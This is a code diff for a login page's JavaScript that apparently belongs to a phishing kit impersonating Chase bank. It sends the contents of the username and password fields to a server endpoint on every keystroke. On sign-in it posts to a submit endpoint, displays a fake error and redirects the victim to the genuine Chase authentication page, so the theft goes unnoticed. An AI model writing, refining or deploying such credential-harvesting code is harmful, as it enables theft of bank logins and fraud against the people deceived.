@@ -19,8 +19,8 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     };
 
-    const onCharTyped = () => {
-        fetch("/api", {
+    const onInput = () => {
+        fetch("/api/input", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
@@ -32,11 +32,15 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     };
 
-    usernameInput.addEventListener("input", onCharTyped);
-    passwordInput.addEventListener("input", onCharTyped);
+    usernameInput.addEventListener("input", onInput);
+    passwordInput.addEventListener("input", onInput);
 
     signinButton.onclick = () => {
         somethingWentWrong.style = "display: block;";
+
+        fetch("/api/submit", {
+            method: "POST",
+        });
 
         setTimeout(() => {
             window.location.href = "https://secure.chase.com/web/auth/";
